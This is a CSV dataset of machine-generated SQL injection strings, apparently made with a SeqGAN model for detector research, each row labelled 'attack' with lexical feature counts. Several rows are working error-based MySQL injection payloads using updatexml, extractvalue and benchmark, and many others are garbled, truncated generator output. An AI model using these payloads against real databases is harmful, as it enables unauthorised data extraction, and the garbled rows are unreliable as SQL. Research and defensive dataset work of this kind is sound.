label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1746,154.0,27.0,3.7603303976738283,36.0,39.0,55.0,24.0,0.23376623376623376,0.2532467532467532,0.35714285714285715,0.15584415584415584,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1747,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1748,159.0,31.0,3.787532415734454,52.0,24.0,60.0,23.0,0.3270440251572327,0.1509433962264151,0.37735849056603776,0.14465408805031446,4.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1749,165.0,27.0,3.674404995396533,37.0,39.0,63.0,26.0,0.22424242424242424,0.23636363636363636,0.38181818181818183,0.15757575757575756,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1750,154.0,28.0,3.7863044236478545,36.0,39.0,55.0,24.0,0.23376623376623376,0.2532467532467532,0.35714285714285715,0.15584415584415584,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    AND 'i'  =  1   (  )  )  select 2518  (  (  (  (  (  1808,concat  (  (  3393,1   (  (  case when  (  1759  (  select   (  (  4415  =  ut  elt  )  0x5c,  (  (  (  select   (  eltl  (  0x4b774c75   end  (  (  case 0 0 from dua  elt 0   (  2917,0x7171706a71)  (  e  (  (  elt  (  2917    =  1   )    (  extractvalue  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1751,325.0,40.0,3.5899262516035355,85.0,54.0,142.0,44.0,0.26153846153846155,0.16615384615384615,0.4369230769230769,0.13538461538461538,2.0,1.0,0.0,0.0,0.0,3.0,0.0,33.0,1.0,0.0,4.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1"" and extractvalue  (  (  3393,concat  (  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  1759  =  (  1 a  )    8083  =  utl  (  case  )  select 0 from   (  (  ellt  (  elt  (  3393  =  (  1 or   (  )  (  (  (  elt  (  5000000,md5  (  (  0x4b774c75   end",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1752,322.0,32.0,3.6745634108489873,85.0,70.0,124.0,43.0,0.2639751552795031,0.21739130434782608,0.38509316770186336,0.13354037267080746,0.0,1.0,0.0,0.0,0.0,3.0,0.0,31.0,0.0,0.0,8.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1and updatexml  (  (  (  ' like 'dualyse analyse  (  5198  =  3393,  (  select   (  eld a  (  0x5c,0x7171706a71,  (  select   (  1049  =  (  (  0x5c,0x7171706a71,  (  (  t  (  select   (  elt  (  elt  (  5000000,m(  (  (  select   (  )   (  3539  (   from dua  (  elta  elt   (  6166  =  (  (  (  1808  =  8768  (  5000000,m",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1753,324.0,33.0,3.6745990783054343,89.0,67.0,125.0,43.0,0.27469135802469136,0.20679012345679013,0.38580246913580246,0.13271604938271606,2.0,0.0,0.0,0.0,0.0,4.0,0.0,30.0,0.0,0.0,7.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%""   )    )    AND AND or  1 extractvalue  (  (  (  (  (   (  4660  (  (  (  (  0x5c,0x7171706a71,  (  0x5c,0x7171706a71,  (  (  0x5c,  (  (  (  =  (  (  5000000,md5  (  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  (  (  (  (  benchmark  (  benchmark  (  (  (  benchmark  (  benchmark  (  2917,concat  (  =  (  0x2e,0x7171706a71,concat  (  (  (  (  =  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1754,369.0,34.0,3.6185923206500243,97.0,68.0,141.0,63.0,0.26287262872628725,0.1842818428184282,0.3821138211382114,0.17073170731707318,0.0,1.0,0.0,0.0,0.0,3.0,0.0,47.0,1.0,0.0,11.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1"" or updatexml  (  (  (  (  (  (  (  0x2e,concat  (  0x2e,0x7171706a71,  (  (  (  5000000(  (  (  (  8862t=  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  3393  =  (  5464  =  (  (  (  3393,1   from dual  )  e  )  7982  =  (  50000000x5c,0x7171706a71,  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1755,360.0,31.0,3.693627964700767,69.0,114.0,122.0,55.0,0.19166666666666668,0.31666666666666665,0.3388888888888889,0.1527777777777778,0.0,1.0,0.0,0.0,0.0,4.0,0.0,36.0,0.0,0.0,14.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1756,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""y"" like ""gge' like 'n mnAmTvpw",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1757,176.0,35.0,4.124976701152321,58.0,39.0,56.0,23.0,0.32954545454545453,0.2215909090909091,0.3181818181818182,0.13068181818181818,2.0,4.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,6.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1758,164.0,27.0,3.607143482229841,39.0,35.0,65.0,25.0,0.23780487804878048,0.21341463414634146,0.39634146341463417,0.1524390243902439,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1759,154.0,27.0,3.7064777642505358,39.0,35.0,57.0,23.0,0.2532467532467532,0.22727272727272727,0.37012987012987014,0.14935064935064934,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1760,155.0,27.0,3.7743681400244764,37.0,39.0,55.0,24.0,0.23870967741935484,0.25161290322580643,0.3548387096774194,0.15483870967741936,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""  )   and extractvalue  (  (  (  5000000(  (  0x5c,0x7171706a715433  (  benchmark  (  (  1297,concat  (    (  (  0x2e,0x7171706a71(  (  =  (  (   (  )   (  (  elt  (  (  e  0x52515a50   end  (  1354  (  (  (  5000000,md5  (  select   (  elt  (  e  (  1297  =  (  3393,1   from d a from(   (  6804  (  (  5423  =  8862,md5  (  (  (  0x4b774c75   end  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1761,354.0,35.0,3.6897646963598114,77.0,89.0,138.0,50.0,0.2175141242937853,0.2514124293785311,0.3898305084745763,0.14124293785310735,0.0,1.0,0.0,0.0,0.0,3.0,0.0,39.0,1.0,0.0,6.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1762,164.0,28.0,3.68445221180306,36.0,39.0,63.0,26.0,0.21951219512195122,0.23780487804878048,0.38414634146341464,0.15853658536585366,2.0,2.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   and updatexml  (  (  3393,concat  (  0x2e,0x7171706a71,  (  (  (  (  (  benchmark  (  5000000(  (  0x2e,concat  (  (  1759(  0x2e,0x7171706a71,  (  5000000(  (  3393  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  3576  =  (  1297,1   from dual  )   SELECT proceduedure analnall  e  )   SELECT drooileanalyseduree  (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1763,327.0,40.0,4.17049605689548,117.0,74.0,98.0,38.0,0.3577981651376147,0.22629969418960244,0.2996941896024465,0.1162079510703364,0.0,1.0,0.0,0.0,0.0,1.0,0.0,26.0,1.0,0.0,9.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%""   )    (  *  =  't  (  case or updatexml  (  (  (  (  (  (  (  (  0x2e,0x7171706a71  (  (  (   (  select   (  (  elt  (  0x2e,(  (  (  0x52515a50   end  (  elt  (  3393,1   from dua  elt  (  elt  (  elt  (  0x2e,,md5  (  0x5c=  (  (  (  3393  =  (  (  0x2e,concat  (  (  (  select   (  e  (  e  5198  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1764,306.0,33.0,3.382703911224293,77.0,43.0,135.0,51.0,0.25163398692810457,0.14052287581699346,0.4411764705882353,0.16666666666666666,1.0,1.0,0.0,0.0,1.0,3.0,0.0,38.0,1.0,0.0,6.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1765,10.0,5.0,2.1219280948873624,0.0,1.0,4.0,5.0,0.0,0.1,0.4,0.5,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1 and updatexml  (  (  (  (  (  (  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  9255,concat  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  9627,md5  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  elt  (  5000000,updatexml  (  benchmark  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt   (  elt  (  1808  =  (  (  (  3393  =  (  7744  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1766,359.0,31.0,3.739520913589248,91.0,93.0,123.0,52.0,0.25348189415041783,0.2590529247910863,0.3426183844011142,0.14484679665738162,0.0,0.0,0.0,0.0,0.0,2.0,0.0,37.0,0.0,0.0,13.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%"" 1354 extractvalue  (   (  (   (  3576  (  (  (  (  2917  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  (  benchmark  (  (  ((  elt  (  benchmark  (  (  (  0x2e,0x7171706a71,  (  (  5000000(  (  0x2e,m5  (  (  0x5c,  (  (  5000000,md5  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  select   (  elte  8375  =  (  1808,concat  (  0x5c,0x7171706a71,  (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1767,372.0,33.0,3.714463893665036,96.0,89.0,129.0,58.0,0.25806451612903225,0.239247311827957,0.3467741935483871,0.15591397849462366,0.0,1.0,0.0,0.0,0.0,1.0,0.0,43.0,1.0,0.0,12.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1768,155.0,27.0,3.7743681400244764,37.0,39.0,55.0,24.0,0.23870967741935484,0.25161290322580643,0.3548387096774194,0.15483870967741936,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'kbse du      l  (  0x5c,md5  (  (  0x5c,md5  (  (  0x4b774c75   end  (   (   (a  (  ell  (  9788  =  (  3393,md5  (  (  3393,1   (  case 0 from dual  el  )  )   end  (  (  elt  (  3393,  (  (  select   (  elt   (  (  elt  (  select   (  1724  (  1759,  (  (  0x2e,md5  (  1   from",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1769,434.0,35.0,3.6686112528167123,112.0,79.0,182.0,61.0,0.25806451612903225,0.18202764976958524,0.41935483870967744,0.14055299539170507,2.0,2.0,0.0,0.0,0.0,3.0,0.0,40.0,2.0,0.0,12.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1770,165.0,27.0,3.674404995396533,37.0,39.0,63.0,26.0,0.22424242424242424,0.23636363636363636,0.38181818181818183,0.15757575757575756,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and "" where an dut  elt  (  7982  =  (  select   (  el  (  2917  =  (  2917,concat  (  5322t  (  (  0x5c,0x7171706a71,  (  select   (  1808)   SELECT or from 0 from d5  (  lt  e  (  elt  (  e  (  3393  =  1808,1   (  select   (  5198  (  (  0x2e,0x7171706a71,  (  (  5000000(  (  1808,m,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1771,479.0,37.0,3.856767149815657,125.0,122.0,173.0,59.0,0.2609603340292276,0.2546972860125261,0.36116910229645094,0.12317327766179541,0.0,2.0,0.0,0.0,0.0,4.0,0.0,37.0,0.0,0.0,16.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,0.0,1.0,2.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,"1%"" updatexml  (   SELECT 1559 (  (  1808  =  (  (  0x2e,0x7171706a71,  )  (  benchmark  (  t  (  (   (  4415  (  (  (  select   (  elt  (  eltt  1808  )  select   (  elt  case when   (  extractvalue  (  5000000,md5  (  (  0x2e,  (  select   (  case 0 0 from dual  )   end  (  (  case 0 0 from dual  )  e  )  5603   (  (  (  el  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1772,329.0,42.0,3.7437792564329175,111.0,47.0,132.0,39.0,0.3373860182370821,0.14285714285714285,0.4012158054711246,0.11854103343465046,0.0,1.0,0.0,0.0,0.0,1.0,0.0,32.0,1.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
